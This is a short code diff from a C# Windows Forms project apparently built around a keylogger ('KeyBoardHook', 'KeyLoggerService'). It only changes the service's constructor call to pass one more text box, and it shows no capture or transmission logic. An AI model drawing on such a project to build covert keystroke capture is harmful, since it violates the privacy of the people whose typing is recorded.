@@ -32,7 +32,7 @@ namespace KeyBoardHook
         {
             if (KeyLoggerService == null)
             {
-                KeyLoggerService = new KeyLoggerService(this.textBox1,this.textBox2,this.comboBox1);
+                KeyLoggerService = new KeyLoggerService(this.textBox1,this.textBox2,this.comboBox1,textBox5);
             }
             KeyLoggerService.Start(comboBox1.Text,textBox3.Text, textBox4.Text);
         }
